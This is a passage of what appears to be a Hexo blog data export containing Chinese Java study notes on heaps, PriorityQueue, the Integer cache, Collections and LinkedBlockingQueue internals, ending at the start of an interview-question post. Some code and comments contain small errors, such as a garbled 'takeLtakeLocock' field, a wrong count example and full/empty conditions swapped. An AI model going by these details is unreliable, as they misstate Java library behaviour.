class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//下沉</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">sink</span><span class=\"params\">(<span class=\"keyword\">int</span> pos)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (<span class=\"number\">2</span> * pos + <span class=\"number\">1</span> &lt;= N) <span class=\"comment\">//子节点不溢出</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> i = <span class=\"number\">2</span> * pos + <span class=\"number\">1</span>; <span class=\"comment\">//i为pos的左儿子</span></span><br><span class=\"line\">\t\t<span class=\"comment\">// i不越界    左儿子小于右儿子   那就让右儿子和pos比较</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (i &lt; N &amp;&amp; heap[i] &lt; heap[i+<span class=\"number\">1</span>]) ++i;</span><br><span class=\"line\">\t\t<span class=\"comment\">//如果pos已经大于i的节点值  就不用交换了直接break</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (heap[pos] &gt;= heap[i]) <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">swap</span>(heap[pos], heap[i]);  <span class=\"comment\">//否则就交换</span></span><br><span class=\"line\">\t\tpos = i; <span class=\"comment\">//更新pos为i</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>源码上移：新增元素时采用上移的方法，即把元素放到数组最后再上移</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">siftUpUsingComparator</span><span class=\"params\">(<span class=\"keyword\">int</span> k, E x)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//当还没到堆顶的时候</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (k &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//获取非叶子节点，右移获得父节点</span></span><br><span class=\"line\">        <span class=\"keyword\">int</span> parent = (k - <span class=\"number\">1</span>) &gt;&gt;&gt; <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"comment\">//获得父节点</span></span><br><span class=\"line\">        Object e = queue[parent];</span><br><span class=\"line\">        <span class=\"comment\">//比较看看符合规则吗</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (comparator.compare(x, (E) e) &gt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">            <span class=\"comment\">//符合直接打断循环</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"comment\">//交换位置将父节点移动到儿子的位置</span></span><br><span class=\"line\">        queue[k] = e;</span><br><span class=\"line\">        <span class=\"comment\">//继续上移</span></span><br><span class=\"line\">        k = parent;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//移动完成后把元素放到位置k也就是某一个父节点的位置</span></span><br><span class=\"line\">    queue[k] = x;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>下移:以collection初始化时采用下移的方法，遍历列表每一个元素都下移。从最后一个非叶子节点开始下移，先获取到左边儿子节点(左移+1)，再获取到右儿子节点(left+1),</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">siftDownUsingComparator</span><span class=\"params\">(<span class=\"keyword\">int</span> k, E x)</span> </span>&#123;</span><br><span class=\"line\">    \t<span class=\"comment\">//非叶子节点</span></span><br><span class=\"line\">        <span class=\"keyword\">int</span> half = size &gt;&gt;&gt; <span class=\"number\">1</span>;</span><br><span class=\"line\">    \t<span class=\"comment\">//遍历每一个非叶子节点寻找自己的位置</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> (k &lt; half) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//左孩子下标，2倍+1</span></span><br><span class=\"line\">            <span class=\"keyword\">int</span> child = (k &lt;&lt; <span class=\"number\">1</span>) + <span class=\"number\">1</span>;</span><br><span class=\"line\">            <span class=\"comment\">//左孩子</span></span><br><span class=\"line\">            Object c = queue[child];</span><br><span class=\"line\">            <span class=\"comment\">//右孩子</span></span><br><span class=\"line\">            <span class=\"keyword\">int</span> right = child + <span class=\"number\">1</span>;</span><br><span class=\"line\">            <span class=\"comment\">//合法比较左右孩子,把右孩子放到左边</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (right &lt; size &amp;&amp;</span><br><span class=\"line\">                comparator.compare((E) c, (E) queue[right]) &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">                c = queue[child = right];</span><br><span class=\"line\">            <span class=\"comment\">//取较大的再与c比较，符合就找到了</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (comparator.compare(x, (E) c) &lt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            <span class=\"comment\">//</span></span><br><span class=\"line\">            queue[k] = c;</span><br><span class=\"line\">            <span class=\"comment\">//继续向下找</span></span><br><span class=\"line\">            k = child;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    \t<span class=\"comment\">//插入找到的位置</span></span><br><span class=\"line\">        queue[k] = x;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"删除堆顶poll\"><a href=\"#删除堆顶poll\" class=\"headerlink\" title=\"删除堆顶poll\"></a>删除堆顶poll</h4><p>　优先队列中，在队列非空情况下移除集合中第一个元素，也就是下标为0的元素，然后将集合中最后一个元素移到下标为0位置，在将下标为0的新元素执行“下沉”操作。如下图示例(注意，下图示例是小堆，不过原理是一样的，图片来自<a href=\"http://www.cnblogs.com/CarpenterLee/p/5488070.html\">深入理解Java PriorityQueue</a>)</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220922193953676.png\" alt=\"image-20220922193953676\"></p>\n<h3 id=\"构造方法\"><a href=\"#构造方法\" class=\"headerlink\" title=\"构造方法\"></a>构造方法</h3><blockquote>\n<p>默认无参:初始化默认长度为11的数组，不设置比较器</p>\n<p>comparator:设置默认长度11,设置比较器</p>\n<p>size,comparator:设置数组长度为size同时设置比较器</p>\n<p>collections:判断collection类型,</p>\n<p>如果是sortedset就获得sortedset的比较器同时复制数组,检查元素是否为null，设置数组以及长度。因为已经排好序了因此不用调整位置。util包下的集合类中只有TreeSet是SortedSet</p>\n<p>如果是PriorityQueue，先获取比较器直接获取原来queue的数组以及长度。</p>\n<p>如果都不是(也就是list或者queue等),设置比较器为空同时直接将元素获取到设置数组以及长度。最后再调用heapify实现堆化</p>\n</blockquote>\n<p>插入逻辑</p>\n<blockquote>\n<p>调用add添加元素,add中直接调用本类的offer方法。offer方法先将modCount自增。判断是否要扩容。扩完容后。再插入通过上移调整位置</p>\n</blockquote>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//默认是小顶堆</span></span><br><span class=\"line\">PriorityQueue&lt;Integer&gt; minHeap = <span class=\"keyword\">new</span> PriorityQueue&lt;Integer&gt;(); </span><br><span class=\"line\"><span class=\"comment\">//大顶堆:在构造方法中传入comparator</span></span><br><span class=\"line\">PriorityQueue&lt;Integer&gt; maxHeap = <span class=\"keyword\">new</span> PriorityQueue&lt;Integer&gt;(<span class=\"number\">11</span>,<span class=\"keyword\">new</span> Comparator&lt;Integer&gt;()&#123; </span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">compare</span><span class=\"params\">(Integer i1,Integer i2)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> i2-i1;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//或者利用工具类返回的Comparator</span></span><br><span class=\"line\">PriorityQueue&lt;Integer&gt; minHeap = <span class=\"keyword\">new</span> PriorityQueue&lt;Integer&gt;(Collections.reverseOrder()); </span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>扩容机制</strong></p>\n<p>小于64就new = 2*old+2,大于等于64: new = 1.5old</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> newCapacity = oldCapacity + ((oldCapacity &lt; <span class=\"number\">64</span>) ?</span><br><span class=\"line\">                                 (oldCapacity + <span class=\"number\">2</span>) :</span><br><span class=\"line\">                                 (oldCapacity &gt;&gt; <span class=\"number\">1</span>));</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p><strong>应用</strong></p>\n<ul>\n<li>选择最大的k个数(最小堆)</li>\n</ul>\n<p>通过维护一个大小为k的优先级队列，遍历元素进入队列，如果队列容量还没到k直接进入，容量大于等于k了就比较队列的最小值(也就是堆顶)与新增元素的大小，后者大就加入，否则什么也不做。相当于看看第4个人的成绩有没有大过第三个人的成绩，大过就取代她。</p>\n<ul>\n<li>选择最小的k个数(最大堆)</li>\n</ul>\n<p>同上</p>\n<h2 id=\"TreeSet\"><a href=\"#TreeSet\" class=\"headerlink\" title=\"TreeSet\"></a><strong>TreeSet</strong></h2><p>TreeSet是一个有序<a href=\"https://so.csdn.net/so/search?q=%E9%9B%86%E5%90%88&spm=1001.2101.3001.7020\">集合</a>，她的元素 按照升序排列，默认是按照自然顺序排列，也就是说TreeSet中的对象元素需要实现Comparable接口。</p>\n<h2 id=\"Integer\"><a href=\"#Integer\" class=\"headerlink\" title=\"Integer\"></a>Integer</h2><ol>\n<li>Byte、Short、Integer、Long、Character都是具有缓存机制的类。缓存工作都是在静态块中完成，在类<a href=\"https://so.csdn.net/so/search?q=%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F&spm=1001.2101.3001.7020\">生命周期</a>的初始化阶段执行。</li>\n<li>缓存范围？<br> Byte，Short，Integer，Long为 -128 到 127</li>\n<li>需要通过valueOf缓存机制才会生效</li>\n</ol>\n<p>1.如果定义的变量在 -128到127之间，则是直接去缓存cache里的值，所以如果数值一致则对应的地址值也会一致，所以我们用 == 判断两个值是否相等，是返回 true的；</p>\n<p>2.如果定义的变量不在 -128到127之间，则通过new Integer(int i)的方式创建数值，并且每次都会重新new一个对象，这就导致每次的对象的数值即使一样但是地址值不一致，所以此时用 == 判断两个值是否相等就不如我们所愿了；</p>\n<p>3.所以我们遇到包装类 Integer定义的变量的时候，如果要判断两个变量的值是否相等，则使用 equals来判断，尽量不要用 == 的来判断。</p>\n<h2 id=\"String\"><a href=\"#String\" class=\"headerlink\" title=\"String\"></a>String</h2><p>String a =new String(“abc”) 实际上是创建了两个对象（假设之前String的<a href=\"https://so.csdn.net/so/search?q=%E5%B8%B8%E9%87%8F%E6%B1%A0&spm=1001.2101.3001.7020\">常量池</a>中没有创建任何对象），<strong>一个是“abc”，一个是new String()。</strong>当第二次创建对象时常量池中含有”abc”，只会创建一次对象。所以正确的为一个或者两个。</p>\n<p>String a = “abc”只是在常量池创建了”abc”对象然后将其引用返回</p>\n<h2 id=\"Object\"><a href=\"#Object\" class=\"headerlink\" title=\"Object\"></a>Object</h2><p>1、==是运算符</p>\n<p>①既可以比较基本类型也可以比较引用类型。 </p>\n<p>②对于基本类型就是比较值（不一定类型要相同）</p>\n<p>   对于引用类型就是比较内存地址，即两个引用是否指向同一个对象。</p>\n<p>2、equals（）是方法</p>\n<p>①只适用于引用数据类型</p>\n<p>②equals属于java.lang.Object类中的方法<br>public boolean equals(object obj) {<br>        return (this ==obj);<br>}<br>说明: object类中定义的equals()和==的作用是相同的:比较两个对象的地址值是否相同，即两个引用是否指向同一对象实体。</p>\n<p>③像String、Date、File、包装类等都重写了Object类的equals（）方法。重写之后，比较的不是两个引用地址是否相同，而是比较两个对象的“内容实体”。</p>\n<h2 id=\"Collection\"><a href=\"#Collection\" class=\"headerlink\" title=\"Collection\"></a>Collection</h2><p>Collection接口是Set、List和Queue接口的父接口，Collection通常情况下不被直接使用。<br> 因此Collection 接口定义了一些通用的方法，List 接口和 Set 接口继承自 Collection 接口，所以也可以调用这些方法。</p>\n<table>\n<thead>\n<tr>\n<th>方法</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>add(Object o)</td>\n<td>向集合中添加一个元素</td>\n</tr>\n<tr>\n<td>addAll(Collection c)</td>\n<td>向集合中添加集合 c 中的所有元素</td>\n</tr>\n<tr>\n<td>clear()</td>\n<td>清除所有元素</td>\n</tr>\n<tr>\n<td>contains(Object o)</td>\n<td>判断集合中是否包含指定元素</td>\n</tr>\n<tr>\n<td>containsAll(Collection c)</td>\n<td>判断集合中是否包含集合 c 中的所有元素</td>\n</tr>\n<tr>\n<td>isEmpty()</td>\n<td>判断集合是否为空</td>\n</tr>\n<tr>\n<td>iterator()</td>\n<td>返回Iterator对象，用于遍历集合中的元素</td>\n</tr>\n<tr>\n<td>remove(Object o)</td>\n<td>删除一个指定元素</td>\n</tr>\n<tr>\n<td>removeAll(Collection c)</td>\n<td>删除集合 c 中所有的元素</td>\n</tr>\n<tr>\n<td>retainAll(Collection c)</td>\n<td>仅保留集合 c 中出现的元素</td>\n</tr>\n<tr>\n<td>int size()</td>\n<td>返回集合中元素的个数</td>\n</tr>\n<tr>\n<td>Object[] toArray()</td>\n<td>把集合转换为一个数组</td>\n</tr>\n</tbody></table>\n<p>​    </p>\n<h2 id=\"Collections\"><a href=\"#Collections\" class=\"headerlink\" title=\"Collections\"></a>Collections</h2><p>Collections 是一个包装类。它包含有各种有关<a href=\"https://so.csdn.net/so/search?q=%E9%9B%86%E5%90%88&spm=1001.2101.3001.7020\">集合</a>操作的静态多态方法。此类不能实例化，就像一个工具类，服务于Java的Collection框架。他提供一系列静态方法实现对各种集合的搜索、排序、线程安全化等操作。</p>\n<table>\n<thead>\n<tr>\n<th>方法</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>sort()</td>\n<td>对集合进行排序</td>\n</tr>\n<tr>\n<td>reverse()</td>\n<td>反转集合中的元素的顺序</td>\n</tr>\n<tr>\n<td>shuffle()</td>\n<td>对集合进行随机排序</td>\n</tr>\n<tr>\n<td>max() , min()</td>\n<td>获取集合最大值、最小值</td>\n</tr>\n<tr>\n<td>binarySearch()</td>\n<td>二分查找查找集合指定元素，返回元素所在索引,若元素不存在，返回该元素最有可能存在的位置索引</td>\n</tr>\n<tr>\n<td>indexOfSubList()</td>\n<td>查找子串在集合中首次出现的位置</td>\n</tr>\n<tr>\n<td>lastIndexOfSubList()</td>\n<td>查找子串在集合中首次出现的位置，从后往前找</td>\n</tr>\n<tr>\n<td>replaceAll()</td>\n<td>替换集合中指定的元素，若元素存在返回true，否则返回false</td>\n</tr>\n<tr>\n<td>rotate()</td>\n<td>集合中的元素向后移动k位置</td>\n</tr>\n<tr>\n<td>copy(list1,list2)</td>\n<td>将集合list2中的元素复制到list1中，并覆盖相应索引位置的元素</td>\n</tr>\n<tr>\n<td>swap()</td>\n<td>交换集合中指定元素的位置</td>\n</tr>\n<tr>\n<td>fill()</td>\n<td>替换集合中的所有元素，用对象object</td>\n</tr>\n</tbody></table>\n<h2 id=\"juc\"><a href=\"#juc\" class=\"headerlink\" title=\"juc\"></a>juc</h2><h3 id=\"阻塞队列\"><a href=\"#阻塞队列\" class=\"headerlink\" title=\"阻塞队列\"></a>阻塞队列</h3><p>阻塞队列中，所有常用的方法都在 BlockingQueue 接口中定义。如</p>\n<p>插入元素的方法： put，offer，add。移除元素的方法： remove，poll，take。</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220923114713055.png\" alt=\"image-20220923114713055\"></p>\n<p>当队列是空的，从队列中获取元素的操作将会被阻塞。<br> 当队列是满的，从队列中添加元素的操作将会被阻塞。</p>\n<p>理由：需要结合生产者与消费者来说。<br>　　好处就是不需要关心什么时候需要阻塞线程，什么时候需要唤醒线程，因为这一切BlockingQueue 都一手包办了。在 concurrent 包发布之前，多线程环境下，程序员必须自己控制这些细节，尤其还要兼顾效率和线程安全，这给程序带来不小的复杂度。</p>\n<p>解耦了生产者与队列之间的关系，不再需要管理队列是否满了或者为空，也不需要担心队列的并发问题。如果没有阻塞队列则需要手动进行同步操作，同步生产者与消费者之间的关系(比如使用wait(),notify(),notifyAll(),或者其他锁)使得代码非常冗杂。阻塞队列正是起到解耦的作用让程序员不再关心队列同步问题，而专注于业务代码。</p>\n<p>应用场景：生产者-消费者（线程池）</p>\n<p>生产者-消费者实现有多种方式</p>\n<ol>\n<li>Object 类中的 wait、notify、notifyAll</li>\n<li>Lock 中 Condition 的 await、signal、signalAll</li>\n<li>BlockingQueue</li>\n</ol>\n<h3 id=\"线程池原理\"><a href=\"#线程池原理\" class=\"headerlink\" title=\"线程池原理\"></a>线程池原理</h3><h3 id=\"LinkedBlockingQueue\"><a href=\"#LinkedBlockingQueue\" class=\"headerlink\" title=\"LinkedBlockingQueue\"></a>LinkedBlockingQueue</h3><p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220923193520403.png\" alt=\"image-20220923193520403\"></p>\n<p>Queue接口定义了3套操作</p>\n<ul>\n<li>add,remove </li>\n<li>offer,poll</li>\n<li>element,peek </li>\n</ul>\n<p>其中offer，poll，peek较为健壮不会返回异常而是返回null</p>\n<p>LBQ除了实现了Queue还实现了BlockingQueue，里面添加了新的一套阻塞操作</p>\n<ul>\n<li>put,take  满了阻塞put，空了阻塞take</li>\n</ul>\n<p>同时添加了增强版offer以及poll，使得这套操作可以在设定等待时间内获取值</p>\n<p>为了实现同步，并发功能，LBQ使用了JUC下的ReentrantLock以及Condition控制</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// take, poll 等移除操作需要持有的锁</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">final</span> ReentrantLock takeLock = <span class=\"keyword\">new</span> ReentrantLock();</span><br><span class=\"line\"><span class=\"comment\">// put, offer 等新增操作需要持有的锁</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">final</span> ReentrantLock putLock = <span class=\"keyword\">new</span> ReentrantLock();</span><br><span class=\"line\"><span class=\"comment\">// 当队列没有数据时，删除元素线程被挂起</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">final</span> Condition notEmpty = takeLock.newCondition();</span><br><span class=\"line\"><span class=\"comment\">// 当队列为空时，添加元素线程被挂起</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">final</span> Condition notFull = putLock.newCondition();</span><br></pre></td></tr></table></figure>\n\n<p>分别是读写锁以及非满与非空条件，condition需要在Reentranlock下使用，也就是必须上锁才可以操作condition对象    </p>\n<blockquote>\n<p>ArrayBlockingQueue中的数字段只是使用int类型为什么可以保证并发安全?</p>\n<p>因为ArrayBlockingQueue使用的读写锁是同一把，属于串行操作，最多只有一个线程修改不会产生并发问题。而LinkedBlockingQueue读写锁不同，最多可能有2个线程读写会产生并发问题因此需要用原子引用类AtomicInteger，通过CAS保证变量正确。</p>\n</blockquote>\n<p>put逻辑</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">put</span><span class=\"params\">(E e)</span> <span class=\"keyword\">throws</span> InterruptedException </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (e == <span class=\"keyword\">null</span>) <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> NullPointerException();</span><br><span class=\"line\">    <span class=\"keyword\">int</span> c = -<span class=\"number\">1</span>;</span><br><span class=\"line\">    Node&lt;E&gt; node = <span class=\"keyword\">new</span> Node&lt;E&gt;(e);  <span class=\"comment\">// 将需要添加的数据封装为 Node</span></span><br><span class=\"line\">    <span class=\"keyword\">final</span> ReentrantLock putLock = <span class=\"keyword\">this</span>.putLock;  <span class=\"comment\">// 获取添加操作的锁</span></span><br><span class=\"line\">    <span class=\"keyword\">final</span> AtomicInteger count = <span class=\"keyword\">this</span>.count;  <span class=\"comment\">// 获取队列实际元素数量</span></span><br><span class=\"line\">    putLock.lockInterruptibly();  <span class=\"comment\">// 运行可被中断加锁 API</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 如果队列元素数量 == 队列最大值，则将线程放入条件队列阻塞</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> (count.get() == capacity) &#123;  </span><br><span class=\"line\">            notFull.await();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        enqueue(node);  <span class=\"comment\">// 执行入队流程</span></span><br><span class=\"line\">        <span class=\"comment\">// 获取值并且自增，举例：count = 0，执行后结果值 count+1 = 2，返回 0</span></span><br><span class=\"line\">        c = count.getAndIncrement();  </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (c + <span class=\"number\">1</span> &lt; capacity)  <span class=\"comment\">// 如果自增过的队列元素 +1 小于队列容器最大数量，唤醒一条被阻塞在插入等待队列的线程</span></span><br><span class=\"line\">            notFull.signal();</span><br><span class=\"line\">    &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">        putLock.unlock();  <span class=\"comment\">// 解锁操作</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (c == <span class=\"number\">0</span>)  <span class=\"comment\">// 当队列中有一条数据，则唤醒消费组线程进行消费</span></span><br><span class=\"line\">        signalNotEmpty();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>入队方法整体流程比较清晰，做了以下几件事：</p>\n<ol>\n<li>队列已满，则将当前线程阻塞</li>\n<li>队列中如果有空缺位置，将数据封装的 Node 执行入队操作</li>\n<li>如果 Node 执行入队操作后，队列还有空余位置，则唤醒等待队列中的添加线程</li>\n<li>如果数据入队前队列没有元素，入队成功后唤醒消费阻塞队列中的线程</li>\n</ol>\n<p><strong>分别是对自己入队，对put进程，take进程发送通知</strong></p>\n<p>take逻辑</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> E <span class=\"title\">take</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> InterruptedException </span>&#123;</span><br><span class=\"line\">    E x;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> c = -<span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> AtomicInteger count = <span class=\"keyword\">this</span>.count;  <span class=\"comment\">// 获取当前队列实际元素个数</span></span><br><span class=\"line\">    <span class=\"keyword\">final</span> ReentrantLock takeLock = <span class=\"keyword\">this</span>.takeLtakeLocock;  <span class=\"comment\">// 获取 takeLock 锁实例</span></span><br><span class=\"line\">    takeLock.lockInterruptibly();  <span class=\"comment\">// 获取 takeLock 锁，获取不到阻塞过程中，可被中断</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (count.get() == <span class=\"number\">0</span>) &#123;  <span class=\"comment\">// 如果当前队列元素 == 0，当前获取节点线程加入等待队列</span></span><br><span class=\"line\">            notEmpty.await();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        x = dequeue();  <span class=\"comment\">// 当前队列元素 &gt; 0，执行头节点出队操作</span></span><br><span class=\"line\">        c = count.getAndDecrement();  <span class=\"comment\">// 获取当前队列元素个数，并将数量 - 1</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (c &gt; <span class=\"number\">1</span>)  <span class=\"comment\">// 当队列中还有还有元素时，唤醒下一个消费线程进行消费</span></span><br><span class=\"line\">            notEmpty.signal();</span><br><span class=\"line\">    &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">        takeLock.unlock();  <span class=\"comment\">// 释放锁</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (c == capacity)  <span class=\"comment\">// 移除元素之前队列是满的，唤醒生产者线程添加元素</span></span><br><span class=\"line\">        signalNotFull();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x;  <span class=\"comment\">// 返回头节点</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>出队操作整体流程清晰明了，和入队操作执行流程相似</p>\n<ol>\n<li>队列已满，则将当前出队线程阻塞</li>\n<li>队列中如果有元素可消费，执行节点出队操作</li>\n<li>如果节点出队后，队列中还有可出队元素，则唤醒等待队列中的出队线程</li>\n<li>如果移除元素之前队列是满的，唤醒生产者线程添加元素</li>\n</ol>\n<p><strong>分别是对自己出对，take进程，put进程发送通知</strong></p>\n<h2 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h2><p>Integer数组转int数组</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Integer[] numInteger=<span class=\"keyword\">new</span> Integer[]&#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>&#125;;</span><br><span class=\"line\"><span class=\"keyword\">int</span>[] num=Arrays.stream(numInteger).mapToInt(Integer::valueOf).toArray();</span><br></pre></td></tr></table></figure>\n\n\n\n<p>offer，add区别：</p>\n<p>一些队列有大小限制，因此如果想在一个满的队列中加入一个新项，多出的项就会被拒绝。</p>\n<p>这时新的 offer 方法就可以起作用了。它不是对调用 add() 方法抛出一个 unchecked 异常，而只是得到由 offer() 返回的 false。</p>\n<p>poll，remove区别：</p>\n<p>remove() 和 poll() 方法都是从队列中删除第一个元素。remove() 的行为与 Collection 接口的版本相似，</p>\n<p>但是新的 poll() 方法在用空集合调用时不是抛出异常，只是返回 null。因此新的方法更适合容易出现异常条件的情况。</p>\n<p>peek，element区别：</p>\n<p>element() 和 peek() 用于在队列的头部查询元素。与 remove() 方法类似，在队列为空时， element() 抛出一个异常，而 peek() 返回 null</p>\n<h3 id=\"有界队列无界队列\"><a href=\"#有界队列无界队列\" class=\"headerlink\" title=\"有界队列无界队列\"></a>有界队列无界队列</h3><p>常见的有界队列为</p>\n<ul>\n<li>ArrayBlockingQueue 基于数组实现的阻塞队列，默认非公平一定要设置初始长度，当容量不够还add时会抛出异常，区别于ArrayList不能无限增加。通过ReentrantLock实现，默认是非公平锁，无法读写分离</li>\n<li>LinkedBlockingQueue 其实也是有界队列，但是不设置大小时就时Integer.MAX_VALUE，内部是基于链表实现的</li>\n<li>ArrayBlockingQueue 与 LinkedBlockingQueue 对比一哈 <ul>\n<li>ArrayBlockingQueue 实现简单，表现稳定，添加和删除使用同一个锁，通常性能不如后者</li>\n<li>LinkedBlockingQueue 添加和删除两把锁是分开的，所以竞争会小一些。高并发下性能提高较大</li>\n</ul>\n</li>\n<li>SynchronousQueue 比较奇葩，内部容量为零，适用于元素数量少的场景，尤其特别适合做交换数据用，内部使用 队列来实现公平性的调度，使用栈来实现非公平的调度，在Java6时替换了原来的锁逻辑，使用CAS代替了</li>\n<li>上面三个队列他们也是存在共性的 <ul>\n<li>put take 操作都是阻塞的</li>\n<li>offer poll 操作不是阻塞的，offer 队列满了会返回false不会阻塞，poll 队列为空时会返回null不会阻塞</li>\n<li>补充一点，并不是在所有场景下，非阻塞都是好的，阻塞代表着不占用CPU，在有些场景也是需要阻塞的，put take 存在必有其存在的必然性</li>\n</ul>\n</li>\n</ul>\n<p>常见的无界队列</p>\n<ul>\n<li>ConcurrentLinkedQueue 无锁队列，底层使用CAS操作，通常具有较高吞吐量，但是具有读性能的不确定性，弱一致性——不存在如ArrayList等集合类的并发修改异常，通俗的说就是遍历时修改不会抛异常</li>\n<li>PriorityBlockingQueue 具有优先级的阻塞队列</li>\n<li>DelayedQueue 延时队列，使用场景 <ul>\n<li>缓存：清掉缓存中超时的缓存数据</li>\n<li>任务超时处理</li>\n<li>补充：内部实现其实是采用带时间的优先队列，可重入锁，优化阻塞通知的线程元素leader</li>\n</ul>\n</li>\n</ul>\n<p>现在也来说一说无界队列的共同点 </p>\n<ul>\n<li>put 操作永远都不会阻塞，空间限制来源于系统资源的限制</li>\n<li>底层都使用CAS无锁编程</li>\n<li></li>\n</ul>\n","categories":["java"],"tags":["hexo"]},{"url":"/p/cl8ttkiho00070sg2bnc72oai/","content":"<p>​    </p>\n<hr>\n<p>title: 面经<br>date: 2022-10-04 14:26:36<br>description: 面试知识点总结<br>id: 65045<br>tags: hexo<br>categories: 面试,java</p>\n<hr>\n<h1 id=\"面经\"><a href=\"#面经\" class=\"headerlink\" title=\"面经\"></a>面经</h1><p> 1.什么是Java虚拟机？为什么Java被称作是“平台无关的编程语言”？<br> 答：JAVA虚拟式是一种抽象化的计算机，有自己完善的硬件架构，如处理器、堆栈等，还有相应的指令系统。是一个可以执行JAVA字节码的虚拟机进程，JAVA的源文件被编译成能被JAVA虚拟机执行的字节码文件。<br> JAVA的运行原理是先用JAVA编译器把源文件转化成字节码文件，再启动虚拟机解释执行JAVA字节码文件。所以只要在各种平台上用JAVA虚拟机就可以执行JAVA程序。</p>\n<p>2.JDK和JRE的区别是什么？<br> JRE(Java Runtime Environment):是JAVA运行时的环境，其包括了虚拟机JVM和Java基础类库。<br> JDK(Java Development  